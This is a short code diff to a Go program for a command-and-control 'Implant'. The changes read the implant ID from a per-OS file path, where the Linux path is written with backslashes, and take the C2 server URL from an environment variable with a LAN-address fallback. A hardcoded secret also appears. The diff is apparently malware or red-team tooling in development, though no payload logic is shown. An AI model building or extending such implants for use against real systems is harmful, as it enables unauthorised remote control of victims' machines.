@@ -34,7 +34,7 @@ type Task struct {
 }
 
 func NewImplant(c2ServerURL string) *Implant {
-	ImplantID := "93cce032-e473-4fda-9954-f67ef4a9d5a2"
+	ImplantID := get_id()
 	return &Implant{
 		C2ServerURL: c2ServerURL,
 		Secret:      "e7bcc0ba5fb1dc9cc09460baaa2a6986",
@@ -207,7 +207,14 @@ func (i *Implant) sendHTTPRequest(method, path string, data []byte, includeToken
 
 
 func get_id() string {
-	const filePath = "C:\\Users\\Public\\Documents\\id.txt"
+	filePath := ""
+	switch runtime.GOOS {
+	case "linux":
+		filePath= "\\etc\\id.txt"
+	case "windows":
+		filePath= "C:\\Users\\Public\\Documents\\id.txt"
+	}
+
 	id, err := os.ReadFile(filePath)
 	if err == nil {
 		return string(id)
@@ -254,7 +261,10 @@ func getOSVersion() string {
 }
 
 func main() {
-	c2ServerURL := "http://127.0.0.1:5000"
+	c2ServerURL := os.Getenv("C2_URL")
+	if c2ServerURL == "" {
+		c2ServerURL = "http://192.168.0.115:5000"
+	}
 
 	implant := NewImplant(c2ServerURL)
 
